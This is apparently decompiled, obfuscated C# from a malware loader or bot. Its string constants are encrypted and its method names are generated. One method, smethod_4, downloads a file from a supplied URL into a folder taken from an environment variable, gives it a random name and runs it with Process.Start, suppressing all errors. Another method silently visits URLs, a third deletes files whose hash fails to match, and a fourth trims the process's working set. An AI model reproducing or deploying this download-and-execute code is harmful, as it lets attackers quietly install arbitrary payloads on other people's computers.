using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace ns0;

internal class Class7
{
	private static Random random_0 = new Random();

	public static string smethod_0(string string_0)
	{
		MD5 mD = new MD5CryptoServiceProvider();
		byte[] array = mD.ComputeHash(Encoding.Default.GetBytes(string_0));
		return BitConverter.ToString(array).Replace(_003CPrivateImplementationDetails_003E_007BBCE1391D_002DB4A1_002D4042_002DA852_002DF45FBF2D78DE_007D.smethod_0(), _003CPrivateImplementationDetails_003E_007BBCE1391D_002DB4A1_002D4042_002DA852_002DF45FBF2D78DE_007D.smethod_1()).ToUpper();
	}

	private static string smethod_1(string string_0)
	{
		FileStream fileStream = File.OpenRead(string_0);
		MD5 mD = new MD5CryptoServiceProvider();
		byte[] array = mD.ComputeHash(fileStream);
		fileStream.Close();
		return BitConverter.ToString(array).Replace(_003CPrivateImplementationDetails_003E_007BBCE1391D_002DB4A1_002D4042_002DA852_002DF45FBF2D78DE_007D.smethod_0(), _003CPrivateImplementationDetails_003E_007BBCE1391D_002DB4A1_002D4042_002DA852_002DF45FBF2D78DE_007D.smethod_1()).ToUpper();
	}

	public static bool _0024MD_002422(string string_0)
	{
		if (!File.Exists(string_0))
		{
			return false;
		}
		if (smethod_1(string_0) != smethod_1(Class2.string_6))
		{
			File.Delete(string_0);
			return false;
		}
		return true;
	}

	private static string smethod_2(int int_0)
	{
		string text = _003CPrivateImplementationDetails_003E_007BBCE1391D_002DB4A1_002D4042_002DA852_002DF45FBF2D78DE_007D.smethod_2();
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < int_0; i++)
		{
			stringBuilder.Append(text.Substring(random_0.Next(0, text.Length), 1));
		}
		return stringBuilder.ToString();
	}

	public static void smethod_3(string string_0)
	{
		//IL_001a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0020: Expected O, but got Unknown
		try
		{
			if (!string_0.StartsWith(_003CPrivateImplementationDetails_003E_007BBCE1391D_002DB4A1_002D4042_002DA852_002DF45FBF2D78DE_007D.smethod_3()))
			{
				string_0 = _003CPrivateImplementationDetails_003E_007BBCE1391D_002DB4A1_002D4042_002DA852_002DF45FBF2D78DE_007D.smethod_3() + string_0;
			}
			WebClient val = new WebClient();
			val.OpenRead(string_0);
			((Component)val).Dispose();
		}
		catch
		{
		}
	}

	public static void smethod_4(string string_0)
	{
		//IL_001a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0020: Expected O, but got Unknown
		try
		{
			if (!string_0.StartsWith(_003CPrivateImplementationDetails_003E_007BBCE1391D_002DB4A1_002D4042_002DA852_002DF45FBF2D78DE_007D.smethod_3()))
			{
				string_0 = _003CPrivateImplementationDetails_003E_007BBCE1391D_002DB4A1_002D4042_002DA852_002DF45FBF2D78DE_007D.smethod_3() + string_0;
			}
			WebClient val = new WebClient();
			string text = string_0.Substring(string_0.LastIndexOf('.')).ToLower();
			string text2 = Environment.GetEnvironmentVariable(_003CPrivateImplementationDetails_003E_007BBCE1391D_002DB4A1_002D4042_002DA852_002DF45FBF2D78DE_007D.smethod_4()) + _003CPrivateImplementationDetails_003E_007BBCE1391D_002DB4A1_002D4042_002DA852_002DF45FBF2D78DE_007D.smethod_5() + smethod_2(random_0.Next(5, 12)) + text;
			val.DownloadFile(string_0, text2);
			((Component)val).Dispose();
			Process.Start(text2);
		}
		catch
		{
		}
	}

	public static void smethod_5()
	{
		GC.Collect();
		GC.WaitForPendingFinalizers();
		if (Environment.OSVersion.Platform == PlatformID.Win32NT)
		{
			SetProcessWorkingSetSize(Process.GetCurrentProcess().get_Handle(), -1, -1);
		}
	}

	[DllImport("kernel32")]
	private static extern int SetProcessWorkingSetSize(IntPtr intptr_0, int int_0, int int_1);
}
